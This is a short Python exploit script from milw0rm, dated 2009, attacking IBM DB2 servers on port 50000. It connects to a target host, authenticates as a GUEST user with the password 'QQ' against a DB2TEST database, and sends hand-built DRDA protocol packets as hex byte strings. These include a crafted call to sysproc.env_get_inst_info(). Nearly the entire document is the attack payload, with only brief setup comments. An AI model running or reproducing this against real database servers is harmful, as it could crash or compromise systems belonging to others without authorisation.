# Discovered by Dennis Yurichev <dennis@conus.info>

# DB2TEST database should be present on target system
# GUEST account with QQ password shoule be present on target system

from sys import *
from socket import *

sockobj = socket(AF_INET, SOCK_STREAM)

sockobj.connect ((argv[1], 50000))

sockobj.send(
"\x00\xBE\xD0\x41\x00\x01\x00\xB8\x10\x41\x00\x7F\x11\x5E\x97\xA8"
"\xA3\x88\x96\x95\x4B\x85\xA7\x85\x40\x40\x40\x40\x40\x40\x40\x40"
"\x40\x40\xF0\xF1\xC2\xF4\xF0\xF3\xC2\xF8\xF0\xF0\xF0\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x60\xF0\xF0"
"\xF0\xF1\xD5\xC1\xD4\xC5\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40"
"\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40"
"\xC4\xC2\xF2\xE3\xC5\xE2\xE3\x40\xF0\xC4\xC2\xF2\x40\x40\x40\x40"
"\x40\x40\x40\x40\x40\x40\x40\x40\x40\x00\x18\x14\x04\x14\x03\x00"
"\x07\x24\x07\x00\x09\x14\x74\x00\x05\x24\x0F\x00\x08\x14\x40\x00"
"\x08\x00\x0B\x11\x47\xD8\xC4\xC2\xF2\x61\xD5\xE3\x00\x06\x11\x6D"
"\xE7\xD7\x00\x0C\x11\x5A\xE2\xD8\xD3\xF0\xF9\xF0\xF5\xF0\x00\x4A"
"\xD0\x01\x00\x02\x00\x44\x10\x6D\x00\x06\x11\xA2\x00\x09\x00\x16"
"\x21\x10\xC4\xC2\xF2\xE3\xC5\xE2\xE3\x40\x40\x40\x40\x40\x40\x40"
"\x40\x40\x40\x40\x00\x24\x11\xDC\x71\x71\x99\xA7\xDF\xD5\x8F\x18"
"\x45\x96\xD6\x07\x08\x8D\xDC\x60\x4F\xFA\xE6\x37\x4D\x6A\x62\xAB"
"\x0C\xE1\x00\xAB\xA3\xD5\x32\x3E"
)

data=sockobj.recv(102400)

sockobj.send(
"\x00\x26\xD0\x41\x00\x01\x00\x20\x10\x6D\x00\x06\x11\xA2\x00\x03"
"\x00\x16\x21\x10\xC4\xC2\xF2\xE3\xC5\xE2\xE3\x40\x40\x40\x40\x40"
"\x40\x40\x40\x40\x40\x40\x00\x35\xD0\x41\x00\x02\x00\x2F\x10\x6E"
"\x00\x06\x11\xA2\x00\x03\x00\x16\x21\x10\xC4\xC2\xF2\xE3\xC5\xE2"
"\xE3\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x00\x06\x11\xA1"
"\x98\x98\x00\x09\x11\xA0\x87\xA4\x85\xA2\xA3\x00\xBF\xD0\x01\x00"
"\x03\x00\xB9\x20\x01\x00\x06\x21\x0F\x24\x07\x00\x23\x21\x35\xF1"
"\xF9\xF2\x4B\xF1\xF6\xF8\x4B\xF0\x4B\xF1\xF0\xF8\x4B\xF3\xF5\xF3"
"\xF3\xF3\x4B\xF0\xF8\xF1\xF0\xF2\xF3\xF1\xF6\xF0\xF8\xF1\x00\x16"
"\x21\x10\xC4\xC2\xF2\xE3\xC5\xE2\xE3\x40\x40\x40\x40\x40\x40\x40"
"\x40\x40\x40\x40\x00\x0C\x11\x2E\xE2\xD8\xD3\xF0\xF9\xF0\xF5\xF0"
"\x00\x0D\x00\x2F\xD8\xE3\xC4\xE2\xD8\xD3\xE7\xF8\xF6\x00\x1C\x00"
"\x35\x00\x06\x11\x9C\x04\xE4\x00\x06\x11\x9D\x04\xB0\x00\x06\x11"
"\x9E\x04\xE4\x00\x06\x19\x13\x04\xB8\x00\x3C\x21\x04\x37\xE2\xD8"
"\xD3\xF0\xF9\xF0\xF5\xF0\xD5\xE3\x40\x40\x40\x40\x40\x40\x40\x40"
"\x40\x40\x40\x40\x40\x40\x40\x40\x97\xA8\xA3\x88\x96\x95\x4B\x85"
"\xA7\x85\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x87\xA4\x85\xA2"
"\xA3\x40\x40\x40\x00\x00\x05\x21\x3B\xF1"
)

data=sockobj.recv(102400)

sockobj.send(
"\x00\x12\xD0\x41\x00\x01\x00\x0C\x10\x41\x00\x08\x14\x04\x14\xCC"
"\x04\xE4\x00\x4E\xD0\x51\x00\x02\x00\x48\x20\x14\x00\x44\x21\x13"
"\x44\x42\x32\x54\x45\x53\x54\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x4E\x55\x4C\x4C\x49\x44\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x53\x59\x53\x53\x48\x32\x30\x30\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x01\x01\x01\x01\x01\x01\x01\x01\x00\x01"
"\x00\x35\xD0\x74\x00\x02\x00\x2F\x24\x14\x00\x00\x00\x00\x25\x53"
"\x45\x54\x20\x43\x55\x52\x52\x45\x4E\x54\x20\x4C\x4F\x43\x41\x4C"
"\x45\x20\x4C\x43\x5F\x43\x54\x59\x50\x45\x20\x3D\x20\x27\x65\x6E"
"\x5F\x55\x53\x27\xFF\x00\x53\xD0\x51\x00\x03\x00\x4D\x20\x0D\x00"
"\x44\x21\x13\x44\x42\x32\x54\x45\x53\x54\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x4E\x55\x4C\x4C\x49\x44\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x53\x59\x53\x53\x48\x32\x30\x30\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x53\x59\x53\x4C\x56\x4C\x30"
"\x31\x00\x04\x00\x05\x21\x16\xF1\x00\x1A\xD0\x53\x00\x03\x00\x14"
"\x24\x50\x00\x00\x00\x00\x0A\x57\x49\x54\x48\x20\x48\x4F\x4C\x44"
"\x20\xFF\x00\x41\xD0\x43\x00\x03\x00\x3B\x24\x14\x00\x00\x00\x00"
"\x31\x73\x65\x6C\x65\x63\x74\x20\x2A\x20\x46\x52\x4F\x4D\x20\x54"
"\x41\x42\x4C\x45\x20\x28\x73\x79\x73\x70\x72\x6F\x63\x2E\x65\x6E"
"\x76\x5F\x67\x65\x74\x5F\x69\x6E\x73\x74\x5F\x69\x6E\x66\x6F\x28"
"\x29\x29\xFF\x00\x66\xD0\x01\x00\x04\x00\x60\x20\x0C\x00\x44\x21"
"\x13\x44\x42\x32\x54\x45\x53\x54\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x4E\x55\x4C\x4C\x49\x44\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x53\x59\x53\x53\x48\x32\x30\x30\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x53\x59\x53\x4C\x56\x4C\x30\x31\x00"
"\x04\x00\x08\x21\x14\x00\x00\x7F\xFF\x00\x06\x21\x41\xFF\xFF\x00"
"\x05\x21\x5D\x01\x00\x05\x21\x4B\xF1"
)

sockobj.close()

# milw0rm.com [2009-04-03]
